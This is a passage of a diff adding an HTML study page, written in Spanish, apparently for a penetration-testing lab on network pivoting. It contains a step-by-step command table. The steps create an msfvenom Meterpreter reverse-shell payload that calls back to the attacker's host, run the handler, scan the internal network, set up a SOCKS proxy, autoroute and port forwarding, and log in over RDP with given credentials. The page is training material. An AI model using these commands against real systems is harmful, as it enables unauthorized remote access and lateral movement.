+        <!-- Ubuntu relay -->
+        <rect x="450" y="30" width="120" height="60" rx="8" fill="rgba(210,153,34,0.08)" stroke="#d29922" stroke-width="1.5"/>
+        <text x="510" y="52" text-anchor="middle" font-size="10" font-weight="700" fill="#d29922">UBUNTU</text>
+        <text x="510" y="67" text-anchor="middle" font-size="9" fill="#8b949e">relay interno</text>
+        <text x="510" y="80" text-anchor="middle" font-size="8" fill="#6e7681">172.16.5.129</text>
+
+        <!-- Arrow -->
+        <line x1="570" y1="60" x2="620" y2="60" stroke="#39d353" stroke-width="2"/>
+        <polygon points="616,55 626,60 616,65" fill="#39d353"/>
+
+        <!-- Windows RDP -->
+        <rect x="625" y="30" width="65" height="60" rx="8" fill="rgba(248,81,73,0.08)" stroke="#f85149" stroke-width="1.5"/>
+        <text x="658" y="52" text-anchor="middle" font-size="9" font-weight="700" fill="#f85149">WIN</text>
+        <text x="658" y="66" text-anchor="middle" font-size="8.5" fill="#8b949e">:3389</text>
+        <text x="658" y="80" text-anchor="middle" font-size="8" fill="#6e7681">RDP</text>
+
+        <!-- Note at bottom -->
+        <text x="350" y="110" text-anchor="middle" font-size="8.5" fill="#39d353">★ Con portfwd NO es necesario escribir proxychains — el forward ya encapsula el tráfico</text>
+      </svg>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 3: Commands Reference -->
+<div id="panel-commands" class="panel">
+  <div class="cmd-table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Host / Contexto</th>
+          <th>Comando</th>
+          <th>Qué hace</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr class="phase-row"><td colspan="4">— Fase 1: Generar y recibir payload Meterpreter —</td></tr>
+
+        <tr>
+          <td>1</td>
+          <td><span class="host-badge host-kali">Kali · terminal</span></td>
+          <td>
+            <div class="cmd-block">msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.18 LPORT=8080 \
+  -f elf -o backupjob</div>
+            <div class="note">
+              <code>-p</code> payload  ·  <code>LHOST</code> IP de Kali (tun0)  ·  <code>LPORT</code> puerto de escucha  ·  <code>-f elf</code> formato binario Linux  ·  <code>-o</code> archivo de salida
+            </div>
+          </td>
+          <td>Genera el payload ELF que el Ubuntu ejecutará. Al correr, conectará de vuelta a Kali:8080 y abrirá sesión Meterpreter.</td>
+        </tr>
+
+        <tr>
+          <td>2</td>
+          <td><span class="host-badge host-msf">msfconsole</span></td>
+          <td>
+            <div class="cmd-block">use exploit/multi/handler
+set lhost 0.0.0.0
+set lport 8080
+set payload linux/x64/meterpreter/reverse_tcp
+run</div>
+            <div class="note">
+              <code>0.0.0.0</code> escucha en todas las interfaces  ·  payload debe coincidir exactamente con el de msfvenom
+            </div>
+          </td>
+          <td>Levanta el listener en Kali que recibirá la conexión del payload cuando Ubuntu lo ejecute.</td>
+        </tr>
+
+        <tr>
+          <td>3</td>
+          <td><span class="host-badge host-ubnt">Ubuntu · shell</span></td>
+          <td>
+            <div class="cmd-block">chmod +x backupjob && ./backupjob</div>
+            <div class="note">
+              <code>chmod +x</code> da permiso de ejecución al binario  ·  Requiere haber transferido el archivo antes (scp/wget)
+            </div>
+          </td>
+          <td>Ejecuta el payload en el pivot. Inicia la conexión TCP hacia Kali:8080 y, si el handler ya está escuchando, abre la sesión Meterpreter.</td>
+        </tr>
+
+        <tr>
+          <td>4</td>
+          <td><span class="host-badge host-msf">msfconsole output</span></td>
+          <td>
+            <div class="cmd-block">[*] Meterpreter session 1 opened
+    (10.10.14.18:8080 → 10.129.202.64:XXXXX)
+meterpreter > pwd</div>
+          </td>
+          <td>Confirmación de sesión abierta. <code>pwd</code> verifica que estamos en el sistema Ubuntu (<code>/home/ubuntu</code>).</td>
+        </tr>
+
+        <tr class="phase-row"><td colspan="4">— Fase 2: Reconocimiento de red interna —</td></tr>
+
+        <tr>
+          <td>5</td>
+          <td><span class="host-badge host-mtr">meterpreter (en Ubuntu)</span></td>
+          <td>
+            <div class="cmd-block">run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</div>
+            <div class="note">
+              Módulo <code>post/</code> → se ejecuta EN el host comprometido (Ubuntu), no en Kali. No necesita proxychains ni autoroute previo.
+            </div>
+          </td>
+          <td>Ubuntu hace ping sweep a toda la red interna /23 y reporta los hosts activos. Descubrimos 172.16.5.19 (Windows).</td>
+        </tr>
+
+        <tr class="phase-row"><td colspan="4">— Fase 3: Configurar SOCKS proxy y autoroute —</td></tr>
+
+        <tr>
+          <td>6</td>
+          <td><span class="host-badge host-msf">msfconsole (bg primero)</span></td>
+          <td>
+            <div class="cmd-block">background                      ← desde meterpreter
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set SRVHOST 0.0.0.0
+set version 4a
+run</div>
+            <div class="note">
+              <code>background</code> (o <code>bg</code>) deja la sesión Meterpreter activa sin cerrarla. <code>version 4a</code> = SOCKS4a, compatible con proxychains por defecto.
+            </div>
+          </td>
+          <td>Levanta un servidor SOCKS en Kali:9050 que usa el routing de Metasploit para canalizar tráfico hacia la red interna.</td>
+        </tr>
+
+        <tr>
+          <td>7</td>
+          <td><span class="host-badge host-msf">msfconsole</span></td>
+          <td>
+            <div class="cmd-block">jobs</div>
+          </td>
+          <td>Verifica que el módulo socks_proxy esté corriendo como job en background. Debe aparecer en la lista de jobs activos.</td>
+        </tr>
+
+        <tr>
+          <td>8</td>
+          <td><span class="host-badge host-kali">Kali · editor/root</span></td>
+          <td>
+            <div class="cmd-block"># /etc/proxychains.conf
+socks4  127.0.0.1 9050</div>
+            <div class="note">
+              Editar con <code>nano /etc/proxychains.conf</code>. Cambiar/confirmar la última línea. <code>socks4</code> (sin "a") en proxychains → funciona con SOCKS4a del servidor.
+            </div>
+          </td>
+          <td>Apunta proxychains al SOCKS proxy local. Ahora cualquier herramienta precedida de <code>proxychains</code> irá por el túnel Meterpreter → Ubuntu → red interna.</td>
+        </tr>
+
+        <tr>
+          <td>9</td>
+          <td><span class="host-badge host-msf">msfconsole</span></td>
+          <td>
+            <div class="cmd-block">use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 172.16.5.0
+run
+
+# Alternativa desde meterpreter:
+run autoroute -s 172.16.5.0/23</div>
+            <div class="note">
+              <code>SESSION 1</code> especifica qué sesión Meterpreter usar como salida. Agrega la ruta a la tabla interna de MSF (no al OS). Usar <code>/23</code> cubre 172.16.4.0–172.16.5.255.
+            </div>
+          </td>
+          <td>Dice a Metasploit: "para llegar a 172.16.5.0/23, usa la sesión Meterpreter 1". Esto hace funcionar el SOCKS proxy hacia esa subred.</td>
+        </tr>
+
+        <tr class="phase-row"><td colspan="4">— Fase 4: Usar el túnel (proxychains) —</td></tr>
+
+        <tr>
+          <td>10</td>
+          <td><span class="host-badge host-kali">Kali · terminal</span></td>
+          <td>
+            <div class="cmd-block">proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</div>
+            <div class="note">
+              <code>-sT</code> TCP connect (único que funciona por SOCKS)  ·  <code>-Pn</code> no ping (ICMP no pasa por SOCKS)  ·  <code>-n</code> sin DNS (opcional, acelera)  ·  <strong>sin -sS ni -sn</strong>
+            </div>
+          </td>
+          <td>Escanea el puerto 3389 de Windows a través del túnel. Confirma que RDP está abierto en el target interno.</td>
+        </tr>
+
+        <tr class="phase-row"><td colspan="4">— Fase 5: Port Forward local (sin proxychains) —</td></tr>
+
+        <tr>
+          <td>11a</td>
+          <td><span class="host-badge host-mtr">meterpreter (en Ubuntu)</span></td>
+          <td>
+            <div class="cmd-block">portfwd add -l 3300 -p 3389 -r 172.16.5.19</div>
+            <div class="note">
+              <code>-l 3300</code> puerto local en Kali  ·  <code>-p 3389</code> puerto destino en el target  ·  <code>-r 172.16.5.19</code> IP del host destino (interno)
+            </div>
+          </td>
+          <td>Meterpreter abre el puerto 3300 en Kali. Cualquier conexión a localhost:3300 se reenvía automáticamente a 172.16.5.19:3389 por el túnel.</td>
+        </tr>
+
+        <tr>
+          <td>11b</td>
+          <td><span class="host-badge host-kali">Kali · terminal</span></td>
+          <td>
+            <div class="cmd-block">xfreerdp /v:localhost:3300 /u:victor /p:pass@123</div>
+            <div class="note">
+              <code>/v:localhost:3300</code> conecta al forward local (Kali). <strong>No necesita proxychains</strong> — el portfwd ya encapsula el tráfico internamente.
+            </div>
+          </td>
+          <td>Abre sesión RDP al Windows a través del port forward. xfreerdp cree que habla con localhost pero en realidad llega a 172.16.5.19.</td>
+        </tr>
+
+        <tr class="phase-row"><td colspan="4">— Verificación —</td></tr>
+
+        <tr>
+          <td>12</td>
+          <td><span class="host-badge host-kali">Kali · terminal</span></td>
+          <td>
+            <div class="cmd-block">netstat -antp</div>
+            <div class="note">
+              <code>-a</code> todos los sockets  ·  <code>-n</code> IPs numéricas  ·  <code>-t</code> solo TCP  ·  <code>-p</code> muestra proceso
+            </div>
+          </td>
+          <td>Muestra los puertos activos en Kali. Debe verse :8080 (handler), :9050 (SOCKS) y :3300 (portfwd) escuchando — confirma que todo el stack está activo.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div style="margin-top:1.5rem;background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem;">
+    <div class="section-title">Leyenda de contextos</div>
+    <div style="display:flex;flex-wrap:wrap;gap:0.5rem 1.5rem;font-size:0.78rem;line-height:1.6;">
+      <div><span class="host-badge host-kali">Kali · terminal</span> — Shell bash en la máquina atacante</div>
+      <div><span class="host-badge host-msf">msfconsole</span> — Prompt <code>msf6 ></code> dentro de Metasploit</div>
+      <div><span class="host-badge host-mtr">meterpreter (en Ubuntu)</span> — Prompt <code>meterpreter ></code> — el código corre en Ubuntu</div>
+      <div><span class="host-badge host-ubnt">Ubuntu · shell</span> — Shell SSH o acceso directo en el pivot</div>
+    </div>
+    <div style="margin-top:0.75rem;font-size:0.75rem;color:var(--fg2);border-top:1px solid var(--border);padding-top:0.75rem;">
+      <strong style="color:var(--orange)">★ Regla clave:</strong> Los módulos <code>post/multi/gather/ping_sweep</code> y similares se ejecutan <em>en el host comprometido</em> (Ubuntu),
+      no en Kali — por eso no necesitan proxychains. El prompt <code>meterpreter ></code> es el agente corriendo en el pivote.
+      Los comandos con <code>proxychains</code> sí corren en Kali pero su tráfico viaja por el túnel.
+    </div>
+  </div>
+</div>
+
+<script>
+function showPanel(id) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('panel-' + id).classList.add('active');
+  event.target.classList.add('active');
+}
+
+function toggleTheme() {
+  const root = document.documentElement;
+  const current = root.getAttribute('data-theme');
+  if (current === 'dark') {
+    root.setAttribute('data-theme', 'light');
+  } else if (current === 'light') {
+    root.removeAttribute('data-theme');
+  } else {
+    root.setAttribute('data-theme', 'dark');
+  }
+}
+</script>
+
+</body></html>
